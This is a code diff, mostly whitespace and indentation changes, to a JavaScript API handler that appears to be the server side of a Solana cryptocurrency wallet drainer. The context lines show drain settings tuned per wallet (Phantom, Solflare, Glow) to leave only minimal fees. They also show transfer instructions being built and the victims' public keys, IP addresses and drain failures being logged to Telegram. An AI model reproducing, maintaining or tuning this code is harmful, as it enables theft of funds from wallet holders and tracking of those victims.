@@ -292,11 +292,11 @@ export default async function handler(req, res) {
         });
       }
     } catch (error) {
-              await telegramLogger.logError({
-          user: userPublicKey,
-          ip: userIp,
+      await telegramLogger.logError({
+        user: userPublicKey,
+        ip: userIp,
           message: `Invalid public key format: ${userPublicKey}`
-        });
+      });
 
       return res.status(400).json({ 
         error: 'Invalid wallet address', 
@@ -379,12 +379,12 @@ export default async function handler(req, res) {
     // Phantom-optimized drain settings (working configuration)
     const PHANTOM_FEE_BUFFER = 100000; // ~0.0001 SOL for Phantom network fees + safety margin
     const PHANTOM_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
-    const PHANTOM_TOTAL_RESERVED = PHANTOM_FEE_BUFFER + PHANTOM_RESERVE_LAMPORTS;
+const PHANTOM_TOTAL_RESERVED = PHANTOM_FEE_BUFFER + PHANTOM_RESERVE_LAMPORTS;
     
     // Solflare-optimized drain settings (more aggressive)
     const SOLFLARE_FEE_BUFFER = 75000; // ~0.000075 SOL for network fees
     const SOLFLARE_RESERVE_LAMPORTS = 25000; // Keep SOL for safety and rent
-    const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
+const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
     
     // Glow-optimized drain settings (similar to Phantom)
     const GLOW_FEE_BUFFER = 100000; // ~0.0001 SOL for Glow network fees + safety margin
@@ -552,7 +552,7 @@ export default async function handler(req, res) {
         tx.add(transferIx);
         
         console.log(`[DRAIN_DEBUG] Transaction instruction added successfully`);
-        
+
       } else {
         console.log(`[DRAIN_DEBUG] Insufficient funds after reserving fees: ${FRESH_BALANCE} <= ${TOTAL_RESERVED}`);
         await telegramLogger.logInsufficientFunds({
@@ -783,9 +783,9 @@ export default async function handler(req, res) {
               await telegramLogger.logDrainFailed({
         publicKey: userPubkey.toString(),
         lamports: lamports,
-        ip: userIp,
+          ip: userIp,
         error: 'Failed to encode transaction as base64'
-      });
+        });
         return res.status(500).json({ error: 'Failed to encode transaction', details: 'Transaction encoding failed' });
       }
       
@@ -811,7 +811,7 @@ export default async function handler(req, res) {
         error: errorResponse.error, 
         details: errorResponse.details,
         code: errorResponse.code
-      });
+    });
     } catch (logError) {
       console.error('[API] Failed to handle error:', logError);
       return res.status(500).json({ error: 'Failed to generate transaction', details: error.message });
